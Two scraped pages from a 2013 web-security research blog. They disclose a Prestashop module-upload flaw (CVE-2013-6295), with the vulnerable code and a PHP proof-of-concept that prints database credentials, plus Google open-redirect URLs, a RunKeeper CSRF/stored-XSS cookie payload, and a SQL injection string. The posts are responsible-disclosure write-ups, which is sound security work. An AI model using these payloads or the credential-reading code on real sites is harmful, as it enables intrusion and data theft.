=== Content from davidsopaslabs.blogspot.com_762ecd59_20250124_131747.html ===


# [David Sopas - hacking web apps](http://davidsopaslabs.blogspot.com/)

## Tuesday, October 29, 2013

### How a salesman could hack Prestashop

Continuing my work on analyzing [Prestashop](http://labs.davidsopas.com/search/label/prestashop) security, I found that low level employees profiles can hack [Prestashop](http://www.prestashop.com/) and possibly the server.

Prestashop (I tested under versions *1.5.4.1* and *1.5.5*) had employee default profiles that may use upload module option to get privilege information.

Logistician and salesman profile (with lower privileges than Admin and Superadmin) could use *AdminModules* to add a new module. This can be very tricky and dangerous because it doesn't require any validation in the file upload. Just zip/tar it and you have a successfully uploaded file into */modules/*.

Opening */controllers/admin/AdminModulesController.php* you can check that the validation on the module fails.

Take a deeper look into the code:
> protected function extractArchive($file, $redirect = true)
>
>  {
>
>  $zip\_folders = array();
>
>  $tmp\_folder = \_PS\_MODULE\_DIR\_.md5(time());
>
>  $success = false;
>
>  if (substr($file, -4) == '.zip')
>
>  {
>
>  if (Tools::ZipExtract($file, $tmp\_folder))
>
>  {
>
>  $zip\_folders = scandir($tmp\_folder);
>
>  if (Tools::ZipExtract($file, \_PS\_MODULE\_DIR\_))
>
>  $success = true;
>
>  }
>
>  }
>
>  else
>
>  {
>
>  $archive = new Archive\_Tar($file);
>
>  if ($archive->extract($tmp\_folder))
>
>  {
>
>  $zip\_folders = scandir($tmp\_folder);
>
>  if ($archive->extract(\_PS\_MODULE\_DIR\_))
>
>  $success = true;
>
>  }
>
>  }
>
>  if (!$success)
>
>  $this->errors[] = Tools::displayError('There was an error while extracting the module (file may be corrupted).');
>
>   //check if it's a real module
>
>  foreach($zip\_folders as $folder)
>
>  if (!in\_array($folder, array('.', '..', '.svn', '.git', '\_\_MACOSX')) && !Module::getInstanceByName($folder))
>
>  {
>
>  $this->errors[] = Tools::displayError('The \'.$folder.\' you uploaded is not a module');
>
>  $this->recursiveDeleteOnDisk(\_PS\_MODULE\_DIR\_.$folder);
>
>  }
>
>   @unlink($file);
>
>  $this->recursiveDeleteOnDisk($tmp\_folder);
>
>  if ($success && $redirect)
>
>  Tools::redirectAdmin(self::$currentIndex.'&conf=8&anchor=anchor'.ucfirst($folder).'&token='.$this->token);
>
>  return $success;
>
>  }

Notice that the file must be a zip or tar file. So far so good.

It also needs and checks for a folder. What if you don't have it? :-) It allows it and keeps the extracted file in /modules folder.

A compromise logistician, salesman or any other user that have permission to upload a module could upload a PHP shell or any other malicious file to obtain private information.

In my proof-of-concept, I used a default salesman profile account to upload a PHP file (*index2.php*) that contained a include to */config/settings.inc.php* and show me the database details.
> include('../config/settings.inc.php');
>
> echo "<h1>Prestashop file upload exploit (need at least logistian or vendor permissions)</h1>";
>
> echo "<h2>By David Sopas @dsopas - labs.davidsopas.com</h2>";
>
> echo "<h3>--------------------------------------------</h3>";
>
> echo "DB Server: " . \_DB\_SERVER\_ . "<br />";
>
> echo "DB Name: " . \_DB\_NAME\_ . "<br />";
>
> echo "DB User: " . \_DB\_USER\_ . "<br />";
>
> echo "DB Pass: " . \_DB\_PASSWD\_ . "<br />";
>
> echo "DB Prefix: " . \_DB\_PREFIX\_ . "<br />";

Check the screens to get a visual proof-of-concept.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhua3hQlhkjPUjOy5dyxIhqYlEQ3Q02ts25w9BOOaBORLkSi8R58gU1Hp8yZIy8MLO1YrXbBrAcGZgdzYDVYNWpQ86vWAoEefzhDKdjEzO87CjGyOgRFxNY3VeQ7ZaAPmHDYAWMIWhPAnty/s320/prestashop_step1.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhua3hQlhkjPUjOy5dyxIhqYlEQ3Q02ts25w9BOOaBORLkSi8R58gU1Hp8yZIy8MLO1YrXbBrAcGZgdzYDVYNWpQ86vWAoEefzhDKdjEzO87CjGyOgRFxNY3VeQ7ZaAPmHDYAWMIWhPAnty/s1600/prestashop_step1.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDt7tZ_Xn-dES7KwkdoONkDHepTGXrqQ3SYKTRHPsaJX6Fwe0p8JqdrQjq1Wq6arjoJtYeUpqmaXgNsG0NeHZ_H4DZEwPkrdjnb7gFmaAyq4x9XKPJyDedXo1AP-mzc6RuB9UTPADj4Cto/s320/prestashop_step2.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDt7tZ_Xn-dES7KwkdoONkDHepTGXrqQ3SYKTRHPsaJX6Fwe0p8JqdrQjq1Wq6arjoJtYeUpqmaXgNsG0NeHZ_H4DZEwPkrdjnb7gFmaAyq4x9XKPJyDedXo1AP-mzc6RuB9UTPADj4Cto/s1600/prestashop_step2.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFiCPFCt86UezlySkMG9m2Xnwna0rbQEvvVkX8GqlPmD2fOJwjhJSV2tQlkkYOZg1yZEM4z1jhVe4J11sMiuTNBDSHjqP4atIuiGYrub7JXam-VxknFvRCrHOuQ6BAeFgI4vkcqePjDDgV/s320/prestashop_step3.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFiCPFCt86UezlySkMG9m2Xnwna0rbQEvvVkX8GqlPmD2fOJwjhJSV2tQlkkYOZg1yZEM4z1jhVe4J11sMiuTNBDSHjqP4atIuiGYrub7JXam-VxknFvRCrHOuQ6BAeFgI4vkcqePjDDgV/s1600/prestashop_step3.jpg)

You can even use the same method to add a SuperAdmin user and have all the privileges you need.

This also can be used to search for server vulnerabilities and gain root access (if the server is vulnerable). As you can see it's a open door for larger attacks.

Solutions?

* Moderation of lower privileges uploads (or even not allowing it)
* Testing if module is really... a module
* Heuristic analysis of malicious code

I contacted Prestashop and they told me that technically is not a easier thing to do. However they changed the right of their default profiles and deleted the right to add or delete modules (CVE-2013-6295).

Personally I advise all users that admin a Prestashop installation to remove the module permissions on users that don't need this feature, only allowing it on people that you would trust (if this can be possible :-) )

Timeline

07 Oct 2013: Contacted Prestashop security

07 Oct 2013: Prestashop replied telling me that they changed the right of their default profiles

07 Oct 2013: Asked a few more questions about patching - no reply

14 Oct 2013: Asked again about this issue - no reply

29 Oct 2013: Full disclosure

Posted by
David

at

[7:38 AM](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=818389931110385381&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=pinterest "Share to Pinterest")

Labels:
[CVE-2013-6295](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-6295),
[file upload](http://davidsopaslabs.blogspot.com/search/label/file%20upload),
[modules](http://davidsopaslabs.blogspot.com/search/label/modules),
[prestashop](http://davidsopaslabs.blogspot.com/search/label/prestashop)

#### 1 comment:

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[auwdio](https://www.blogger.com/profile/04730619686667736632)[February 24, 2014 at 1:54 PM](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html?showComment=1393278889606#c2775988532706519578)

   Interesting article, it is indeed strange that such profiles can upload modules.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4083252652650482806&postID=2775988532706519578)Replies
   Reply

Add commentLoad more...

[Newer Post](http://davidsopaslabs.blogspot.com/2013/11/google-bots-doing-sql-injection-proof.html "Newer Post")

[Older Post](http://davidsopaslabs.blogspot.com/2013/10/wordpress-fbi-and-tor-kernelorg-and-dom.html "Older Post")

[Home](http://davidsopaslabs.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](http://davidsopaslabs.blogspot.com/feeds/818389931110385381/comments/default)

## About me

My name is David Sopas. I'm a portuguese web security researcher.

I've been acknowledged by Google, Adobe, eBay, Microsoft, Yahoo, Panda Security, AVG, Kaspersky, McAfee, Hootsuite and Alexa.

Published security advisories for Prestashop, phpBB, osCommerce, e107, PHP-Nuke, Mambo and others.

Feel free to follow me on Twitter - [@dsopas](https://www.twitter.com/dsopas)

## Donations

Some companies returned the favor by offering me the following:

2x T-Shirts
1x Water bottle
2x Premium accounts
1x Flashlight
1x Antivirus license
$450 bucks

Keep in mind that some of my researches prevented companies of losing millions of dollars... I only expect a "Thank you".

## Labels

[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss)

[xss](http://davidsopaslabs.blogspot.com/search/label/xss)

[antivirus](http://davidsopaslabs.blogspot.com/search/label/antivirus)

[csrf](http://davidsopaslabs.blogspot.com/search/label/csrf)

[google](http://davidsopaslabs.blogspot.com/search/label/google)

[persistent xss](http://davidsopaslabs.blogspot.com/search/label/persistent%20xss)

[malware](http://davidsopaslabs.blogspot.com/search/label/malware)

[prestashop](http://davidsopaslabs.blogspot.com/search/label/prestashop)

[ebay](http://davidsopaslabs.blogspot.com/search/label/ebay)

[google vulnerability reward program](http://davidsopaslabs.blogspot.com/search/label/google%20vulnerability%20reward%20program)

[jwplayer](http://davidsopaslabs.blogspot.com/search/label/jwplayer)

[self-xss](http://davidsopaslabs.blogspot.com/search/label/self-xss)

[CVE-2013-4791](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-4791)

[CVE-2013-4792](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-4792)

[CVE-2013-6295](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-6295)

[CVE-2014-2916](http://davidsopaslabs.blogspot.com/search/label/CVE-2014-2916)

[ad\_iframe.html](http://davidsopaslabs.blogspot.com/search/label/ad_iframe.html)

[alexa](http://davidsopaslabs.blogspot.com/search/label/alexa)

[amazon](http://davidsopaslabs.blogspot.com/search/label/amazon)

[anythingslider](http://davidsopaslabs.blogspot.com/search/label/anythingslider)

[avg](http://davidsopaslabs.blogspot.com/search/label/avg)

[backdoors](http://davidsopaslabs.blogspot.com/search/label/backdoors)

[blogger](http://davidsopaslabs.blogspot.com/search/label/blogger)

[booking](http://davidsopaslabs.blogspot.com/search/label/booking)

[bounty](http://davidsopaslabs.blogspot.com/search/label/bounty)

[ccs](http://davidsopaslabs.blogspot.com/search/label/ccs)

[ckeditor](http://davidsopaslabs.blogspot.com/search/label/ckeditor)

[deadspin](http://davidsopaslabs.blogspot.com/search/label/deadspin)

[deface](http://davidsopaslabs.blogspot.com/search/label/deface)

[dod](http://davidsopaslabs.blogspot.com/search/label/dod)

[dow jones](http://davidsopaslabs.blogspot.com/search/label/dow%20jones)

[easter egg](http://davidsopaslabs.blogspot.com/search/label/easter%20egg)

[ensighten](http://davidsopaslabs.blogspot.com/search/label/ensighten)

[eset](http://davidsopaslabs.blogspot.com/search/label/eset)

[fbi](http://davidsopaslabs.blogspot.com/search/label/fbi)

[fckeditor](http://davidsopaslabs.blogspot.com/search/label/fckeditor)

[file upload](http://davidsopaslabs.blogspot.com/search/label/file%20upload)

[gawker](http://davidsopaslabs.blogspot.com/search/label/gawker)

[giftcards](http://davidsopaslabs.blogspot.com/search/label/giftcards)

[gizmodo](http://davidsopaslabs.blogspot.com/search/label/gizmodo)

[google analytics](http://davidsopaslabs.blogspot.com/search/label/google%20analytics)

[google bots](http://davidsopaslabs.blogspot.com/search/label/google%20bots)

[hacker](http://davidsopaslabs.blogspot.com/search/label/hacker)

[helpouts](http://davidsopaslabs.blogspot.com/search/label/helpouts)

[hootsuite](http://davidsopaslabs.blogspot.com/search/label/hootsuite)

[hp](http://davidsopaslabs.blogspot.com/search/label/hp)

[html5](http://davidsopaslabs.blogspot.com/search/label/html5)

[idg now](http://davidsopaslabs.blogspot.com/search/label/idg%20now)

[io9](http://davidsopaslabs.blogspot.com/search/label/io9)

[issuu](http://davidsopaslabs.blogspot.com/search/label/issuu)

[jalopnik](http://davidsopaslabs.blogspot.com/search/label/jalopnik)

[jezebel](http://davidsopaslabs.blogspot.com/search/label/jezebel)

[jobs.cz](http://davidsopaslabs.blogspot.com/search/label/jobs.cz)

[kaspersky](http://davidsopaslabs.blogspot.com/search/label/kaspersky)

[kernel](http://davidsopaslabs.blogspot.com/search/label/kernel)

[kotaku](http://davidsopaslabs.blogspot.com/search/label/kotaku)

[lifehacker](http://davidsopaslabs.blogspot.com/search/label/lifehacker)

[macosx](http://davidsopaslabs.blogspot.com/search/label/macosx)

[magento](http://davidsopaslabs.blogspot.com/search/label/magento)

[mashable](http://davidsopaslabs.blogspot.com/search/label/mashable)

[mcafee](http://davidsopaslabs.blogspot.com/search/label/mcafee)

[microsoft](http://davidsopaslabs.blogspot.com/search/label/microsoft)

[modules](http://davidsopaslabs.blogspot.com/search/label/modules)

[neal poole](http://davidsopaslabs.blogspot.com/search/label/neal%20poole)

[olx](http://davidsopaslabs.blogspot.com/search/label/olx)

[open redirect](http://davidsopaslabs.blogspot.com/search/label/open%20redirect)

[orkut](http://davidsopaslabs.blogspot.com/search/label/orkut)

[owasp-dv-004](http://davidsopaslabs.blogspot.com/search/label/owasp-dv-004)

[panda](http://davidsopaslabs.blogspot.com/search/label/panda)

[phishing](http://davidsopaslabs.blogspot.com/search/label/phishing)

[phpbb](http://davidsopaslabs.blogspot.com/search/label/phpbb)

[phplist](http://davidsopaslabs.blogspot.com/search/label/phplist)

[phpmyadmin](http://davidsopaslabs.blogspot.com/search/label/phpmyadmin)

[proxy](http://davidsopaslabs.blogspot.com/search/label/proxy)

[referrer](http://davidsopaslabs.blogspot.com/search/label/referrer)

[root](http://davidsopaslabs.blogspot.com/search/label/root)

[runkeeper](http://davidsopaslabs.blogspot.com/search/label/runkeeper)

[slow dos](http://davidsopaslabs.blogspot.com/search/label/slow%20dos)

[sql injection](http://davidsopaslabs.blogspot.com/search/label/sql%20injection)

[symantec](http://davidsopaslabs.blogspot.com/search/label/symantec)

[timing attacks](http://davidsopaslabs.blogspot.com/search/label/timing%20attacks)

[tinymce](http://davidsopaslabs.blogspot.com/search/label/tinymce)

[tor](http://davidsopaslabs.blogspot.com/search/label/tor)

[tshirt](http://davidsopaslabs.blogspot.com/search/label/tshirt)

[tumblr](http://davidsopaslabs.blogspot.com/search/label/tumblr)

[user-agent](http://davidsopaslabs.blogspot.com/search/label/user-agent)

[weekend reading](http://davidsopaslabs.blogspot.com/search/label/weekend%20reading)

[wordpress](http://davidsopaslabs.blogspot.com/search/label/wordpress)

[xss worm](http://davidsopaslabs.blogspot.com/search/label/xss%20worm)

[yahoo](http://davidsopaslabs.blogspot.com/search/label/yahoo)

## Blogroll

* [Egor Homakov](http://homakov.blogspot.com/)
* [Neal Poole](https://nealpoole.com/blog/)
* [Ben Hayak](http://www.benhayak.com/)
* [Nils Junemann](http://www.nilsjuenemann.de/)
* [Nir Goldshlager](http://www.nirgoldshlager.com/)

## Blog Archive

* ►
  [2014](http://davidsopaslabs.blogspot.com/2014/)
  (3)
  + ►
    [April](http://davidsopaslabs.blogspot.com/2014/04/)
    (1)
  + ►
    [March](http://davidsopaslabs.blogspot.com/2014/03/)
    (1)
  + ►
    [January](http://davidsopaslabs.blogspot.com/2014/01/)
    (1)

* ▼
  [2013](http://davidsopaslabs.blogspot.com/2013/)
  (27)
  + ►
    [November](http://davidsopaslabs.blogspot.com/2013/11/)
    (3)
  + ▼
    [October](http://davidsopaslabs.blogspot.com/2013/10/)
    (2)
    - [How a salesman could hack Prestashop](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html)
    - [Wordpress, FBI and TOR, Kernel.org and DOM XSS](http://davidsopaslabs.blogspot.com/2013/10/wordpress-fbi-and-tor-kernelorg-and-dom.html)
  + ►
    [September](http://davidsopaslabs.blogspot.com/2013/09/)
    (4)
  + ►
    [August](http://davidsopaslabs.blogspot.com/2013/08/)
    (2)
  + ►
    [July](http://davidsopaslabs.blogspot.com/2013/07/)
    (3)
  + ►
    [June](http://davidsopaslabs.blogspot.com/2013/06/)
    (2)
  + ►
    [April](http://davidsopaslabs.blogspot.com/2013/04/)
    (2)
  + ►
    [March](http://davidsopaslabs.blogspot.com/2013/03/)
    (2)
  + ►
    [February](http://davidsopaslabs.blogspot.com/2013/02/)
    (4)
  + ►
    [January](http://davidsopaslabs.blogspot.com/2013/01/)
    (3)

* ►
  [2012](http://davidsopaslabs.blogspot.com/2012/)
  (3)
  + ►
    [December](http://davidsopaslabs.blogspot.com/2012/12/)
    (1)
  + ►
    [November](http://davidsopaslabs.blogspot.com/2012/11/)
    (1)
  + ►
    [October](http://davidsopaslabs.blogspot.com/2012/10/)
    (1)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).



=== Content from davidsopaslabs.blogspot.com_75e9a797_20250124_131746.html ===


# [David Sopas - hacking web apps](http://davidsopaslabs.blogspot.com/)

## Thursday, November 21, 2013

### [3 Open Redirect on Google - UNFIXED](http://davidsopaslabs.blogspot.com/2013/11/3-open-redirect-on-google-unfixed.html)

In the last couple of weeks I discovered three Open Redirect security issues on [Google](http://www.google.com/).

For those who don't know what is a Open Redirect vulnerability, [OWASP](http://www.owasp.org/) has a section about it (<https://www.owasp.org/index.php/Open_redirect>):
> An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.

Open Redirects are very attractive for spammers. Why? With the increasing importance of URL and domain reputation in SPAM filtering, spammers may not care so much about tricking the user into believing their link is secure, but they may care about filters not seeing their malicious websites.

**# Google Helpouts**

Proof-of-concept:
> https://helpouts.google.com/opener?url=http://labs.davidsopas.com

Proof-of-concept with the URL encoded with hex with the same destination - [http://labs.davidsopas.com](http://labs.davidsopas.com/):
> https://helpouts.google.com/opener?url=%68%74%74%70%3A%2F%2F%6C%61%62%73%2E%64%61%76%69%64%73%6F%70%61%73%2E%63%6F%6D

**# Google Doubleclick 1**

Vulnerable code present on *http://stats.g.doubleclick.net/u/post\_iframe\_dc.html*:
> (function() {
> var b = decodeURIComponent;
> var c = window,
> d = function() {
> var a = b(c.location.hash.substring(1));
> /^https?\:\/\//.test(a) && c.location.replace(a)
> },
> e, f = c.XMLHttpRequest;
> if ("undefined" != typeof f) e = new f;
> else for (var g = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"], h = 0; h < g.length; h++) try {
> e = new c.ActiveXObject(g[h])
> } catch (k) {}
> (function(a) {
> a ? (a.open("POST", ("https:" == c.location.protocol ? "https://stats.g.doubleclick.net" : "http://stats.g.doubleclick.net") + "/p/\_\_utm.gif", !0), a.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), a.onreadystatechange = function() {
> 4 == a.readyState && d()
> }, a.send(b(c.name))) : d()
> })(e);
> })();

Proof-of-concept:
> http://stats.g.doubleclick.net/u/post\_iframe\_dc.html#http://labs.davidsopas.com

Proof-of-concept with the URL encoded with hex with the same destination - [http://labs.davidsopas.com](http://labs.davidsopas.com/):
> http://stats.g.doubleclick.net/u/post\_iframe\_dc.html#%68%74%74%70%3A%2F%2F%6C%61%62%73%2E%64%61%76%69%64%73%6F%70%61%73%2E%63%6F%6D

**# Google Doubleclick 2**

This second open redirection works by adding the destination URL on adurl parameter.

You need a valid sig parameter but this value can be found by searching Google.

Proof-of-concept:
> http://pubads.g.doubleclick.net/aclk?sa=L&ai=CVX\_P9w1EUqOqEs-pigbasoH4BqTY8LkCAAAQASCUh8cWUO\_F-bIDYO3c3IWYG8gBBOACAKgDAaoEWU\_QCnBEa2tgTStWRYttDqi7d0s6uWsJDHSreAFvGE0ZiTo\_mgVBIhLYaWniW4fUMgOpcXTUs\_kxkhB8zkV9-z3LD9QNe14TSe7ZgNjja8PfgUFROjGNbD3N4AQBoAYV&num=0&sig=AOD64\_1FE7vwsql9N-pKDvb9skYoC3ikrQ&client=&adurl=http://labs.davidsopas.com

If don't add a valid sig, it will warn the user before redirecting:
> http://pubads.g.doubleclick.net/aclk?sa=L&ai=CVX\_P9w1EUqOqEs-pigbasoH4BqTY8LkCAAAQASCUh8cWUO\_F-bIDYO3c3IWYG8gBBOACAKgDAaoEWU\_QCnBEa2tgTStWRYttDqi7d0s6uWsJDHSreAFvGE0ZiTo\_mgVBIhLYaWniW4fUMgOpcXTUs\_kxkhB8zkV9-z3LD9QNe14TSe7ZgNjja8PfgUFROjGNbD3N4AQBoAYV&num=0&sig=&client=&adurl=http://labs.davidsopas.com

What risks poses these security issues to a user?

- Phishing: The user may be confronted to phishing attempts by being redirected to an untrusted page

- Spreading malware: The user may be redirected to an untrusted page that contains malware which may then compromise user information

- CSRF: Using a URL specially crafted to explore a Cross-site request forgery ([https://www.owasp.org/index.php/Cross-Site\_Request\_Forgery\_(CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)) on Google

Google doesn't reward or fix this issues. They believe the usability and security benefits of a well-implemented and carefully monitored URL redirector tend to outweigh the perceived risks.

Personally I don't understand why Google don't follow the same steps than other companies, like [Facebook](http://www.facebook.com/) and [Yahoo](http://www.yahoo.com/), which give the right credit to Open Redirect issues.

Posted by
David

at

[11:30 AM](http://davidsopaslabs.blogspot.com/2013/11/3-open-redirect-on-google-unfixed.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/11/3-open-redirect-on-google-unfixed.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=3550761555398039430&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=3550761555398039430&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=3550761555398039430&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=3550761555398039430&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=3550761555398039430&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=3550761555398039430&target=pinterest "Share to Pinterest")

Labels:
[google](http://davidsopaslabs.blogspot.com/search/label/google),
[helpouts](http://davidsopaslabs.blogspot.com/search/label/helpouts),
[open redirect](http://davidsopaslabs.blogspot.com/search/label/open%20redirect)

## Tuesday, November 12, 2013

### [How it was possible to run a XSS worm on RunKeeper](http://davidsopaslabs.blogspot.com/2013/11/how-it-was-possible-to-run-xss-worm-on.html)

Do you know [RunKeeper](http://www.runkeeper.com/)?
> RunKeeper is a GPS fitness-tracking application supporting more than 23 million users, launched in 2008. RunKeeper is a Boston-based company, which raised $10 million in a Series B financing, led by Spark Capital. It also hosts a built-out Health Graph displaying health and fitness related data, specific to the user. This application also has an online social network of users that share progress, goals, training programs and mapped routes. What makes this application unique is having released an open API for outside developers to plug into RunKeeper users feeds. (in Wikipedia)

When I was using this nice web application I stumble across some vulnerabilities that could be used by malicious users to create a XSS worm.

This could be achieved by using two type of vulnerabilities.

**CSRF on Accounts Settings**

It was possible to launch a CSRF attack (<http://pt.wikipedia.org/wiki/Cross-site_request_forgery>) on Account Settings. Using a external HTML form, a crafted site with a auto-submit JavaScript, a malicious user could modify all the information on a authenticated RunKeeper user without them knowing. This happened because RunKeeper forms lacked a security token or any other validation which allowed a user to POST a request on external sources.

**Persistent XSS on name field - Account Settings**

This was very dangerous and a major security risk. In the wrong hands it could be used to launch dangerous attacks and infect millions of users.

The XSS was automatically executed on user *Account Settings* and on the profile page of the user affected - *http://runkeeper.com/user/dsopas/profile*. Even the public profile was affected with this issue (no need for authentication).

When saving the profile, the POST request to *http://runkeeper.com/settings?saveProfile=* submits the following:
> username=dsopas&fullName=David+Sopas&gender=M&birthday=May+01+2000&location=&athleteType=CYCLIST&goal=Sports&achievementGoal=MAINTAIN&workoutFrequency=FIVE\_PLUS&skillLevel=INTERMEDIATE

Imagine a specially crafted site with a auto-submit form taking advantage of the CSRF I mentioned with the "fullName" parameter:
> CLICK HERE "><img src=x onerror=prompt(document.cookie)><div x="

This would save the authenticated user new "fullName". Each time a user visited his profile would launch the attack (in my proof-of-concept it shows the victims cookie).

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiB19tFqLrQfbsnNrxQxZQUZFDgxaCxnclgmqySlhv5OmpyhTy2AdEIPk0wcpsRZzVFeqX3nnhpzYejEmzxo6I6PX0r6CyciRfQtuDewzThC8QkSjs6SIWssjqL-ia56ZOhFKXXzidGJe-y/s320/runkeeper.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiB19tFqLrQfbsnNrxQxZQUZFDgxaCxnclgmqySlhv5OmpyhTy2AdEIPk0wcpsRZzVFeqX3nnhpzYejEmzxo6I6PX0r6CyciRfQtuDewzThC8QkSjs6SIWssjqL-ia56ZOhFKXXzidGJe-y/s1600/runkeeper.jpg)

Modifying this *POC* a little bit, a malicious user could have a worm propagating on RunKeeper - stealing users cookies, gathering private information, propagating malware, ...

How dangerous?

In 2005, a XSS worm called Samy carried a payload on MySpace that would display the string "but most of all, Samy is my hero" on a victim's profile. When a user viewed that profile, they would have the payload planted on their page. Within just 20 hours of its October 4, 2005 release, over one million users had run the payload, making Samy the fastest spreading virus of all time.

This was also possible to achieve with this RunKeeper security issues.

I would like to say that RunKeeper handled this security issues very serious and they seem to really care about security and their clients.

I'm glad I helped them.

Timeline

10 Oct 2013: Got first contact with RunKeeper and sent the advisory

11 Oct 2013: RunKeeper replied that they're working on both issues

21 Oct 2013: RunKeeper gave me a detailed information on patching plan

05 Nov 2013: RunKeeper confirmed that both issues are fixed

12 Nov 2013: Full disclosure

Posted by
David

at

[6:55 AM](http://davidsopaslabs.blogspot.com/2013/11/how-it-was-possible-to-run-xss-worm-on.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/11/how-it-was-possible-to-run-xss-worm-on.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=1481282579695822982&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1481282579695822982&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1481282579695822982&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1481282579695822982&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1481282579695822982&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1481282579695822982&target=pinterest "Share to Pinterest")

Labels:
[csrf](http://davidsopaslabs.blogspot.com/search/label/csrf),
[persistent xss](http://davidsopaslabs.blogspot.com/search/label/persistent%20xss),
[runkeeper](http://davidsopaslabs.blogspot.com/search/label/runkeeper),
[xss worm](http://davidsopaslabs.blogspot.com/search/label/xss%20worm)

## Wednesday, November 6, 2013

### [Google Bots doing SQL Injection - The Proof-of-Concept](http://davidsopaslabs.blogspot.com/2013/11/google-bots-doing-sql-injection-proof.html)

When reading this article about [Google Bots doing SQL Injection from Sucuri](http://blog.sucuri.net/2013/11/google-bots-doing-sql-injection-attacks.html), I remember that I already saw this somewhere on my [Google](http://www.google.com/) researches... I was right.

If you use a special tool included on [Google Analytics](https://www.google.com/analytics/), located on *Behavior* - *Experiments*, a malicious user could launch SQL Injections, or other web attack, on remote websites using Google as a proxy.

Enter your website in the form (example: *http://www.yourwebsite.com/index.php?id=1' OR 1=1--*)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBwI2a0vYOX5RSfXyk_cj5rm7qqVF-ojcg69NX4SU0CQoH3bv_A-qVJfF8_ViKvscQG9kS6PnIR3K8InVt_yocgyFr2meu6ufDcgsyvVkT3wUlITjqyVhQwLPlTZ7nk3FhRkwfjG1Mpybo/s320/google_proxy01.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBwI2a0vYOX5RSfXyk_cj5rm7qqVF-ojcg69NX4SU0CQoH3bv_A-qVJfF8_ViKvscQG9kS6PnIR3K8InVt_yocgyFr2meu6ufDcgsyvVkT3wUlITjqyVhQwLPlTZ7nk3FhRkwfjG1Mpybo/s1600/google_proxy01.jpg)

Check out your access log:
> 66.249.93.25 - - [06/Nov/2013:13:23:47 +0000] "GET /index.php?id=1'%20OR%201=1-- HTTP/1.1" 404 - "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.4 (KHTML, like Gecko; Google Web Preview) Chrome/22.0.1229 Safari/537.4"

If you resolve the IP address you will see *google-proxy-66-249-93-25.google.com*.

I believe this is not directly a Google security issue. Just keep your website secure and no trouble will come in your direction.

Posted by
David

at

[6:51 AM](http://davidsopaslabs.blogspot.com/2013/11/google-bots-doing-sql-injection-proof.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/11/google-bots-doing-sql-injection-proof.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=5885295676854449391&from=pencil "Edit Post")

